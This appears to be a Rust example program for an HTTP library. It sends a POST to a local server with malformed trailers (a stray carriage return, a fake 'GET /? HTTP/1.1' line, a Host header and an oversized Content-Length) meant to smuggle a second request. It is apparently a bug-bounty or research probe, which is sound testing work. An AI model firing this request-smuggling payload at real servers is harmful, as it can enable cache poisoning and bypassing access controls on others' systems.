use riphttplib::h1::H1;
use riphttplib::h2::H2;
use riphttplib::h3::H3;
use riphttplib::types::{ClientTimeouts, Header, Protocol, Request};
use serde_json::json;
use std::time::Duration;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let request = Request::new("http://localhost:4444", "POST")?
            .header(Header::new(
                "user-agent".to_string(),
                "aa".to_string(),
            ))
            .header(Header::new("bug-bounty".to_string(), "scan".to_string()))
            .header(Header::new("te".to_string(), "trailers".to_string()))
            .body("test")
            .trailer(Header::new_valueless("\r".to_string()))
            .trailer(Header::new("GET /?".to_string(), " HTTP/1.1".to_string()))
            .trailer(Header::new("Host".to_string(), "g0.5-4.cc".to_string()))
            .trailer(Header::new("Content-Length".to_string(), "9999999999999".to_string()))
            // .timeout(timeouts.clone())
            .follow_redirects(true);

    {
        let client = H1::new();
        let response = client.response(request.clone()).await?;

        println!("HTTP/1.1");

        println!("\n{} {}", response.protocol, response.status);
        for header in &response.headers {
            println!("{}", header);
        }
        // println!("\n{}", response.text());
        println!("\n{}", String::from_utf8_lossy(&response.body));
        if let Some(frames) = &response.frames {
            println!("Captured {} frame(s)", frames.len());
        }
    }

    Ok(())
}
